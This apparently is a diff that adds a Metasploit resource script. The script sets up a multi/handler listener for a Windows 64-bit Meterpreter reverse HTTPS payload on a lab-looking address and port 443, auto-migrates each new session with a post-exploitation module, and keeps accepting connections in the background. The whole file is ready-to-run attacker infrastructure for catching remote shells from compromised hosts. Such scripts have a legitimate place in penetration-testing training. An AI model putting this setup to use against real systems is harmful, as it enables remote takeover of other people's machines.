@@ -1,0 +1,18 @@
+=begin
+
+starts a multi/handler listener for a non-staged Windows 64-bit Meterpreter payload.
+
+=end
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST 192.168.119.4
+set LPORT 443
+
+# configure the AutoRunScript option to automatically execute
+set AutoRunScript post/windows/manage/migrate 
+
+# ensure that the listener keeps accepting new connections after a session is created 
+set ExitOnSession false
+# fire for effect
+run -z -j
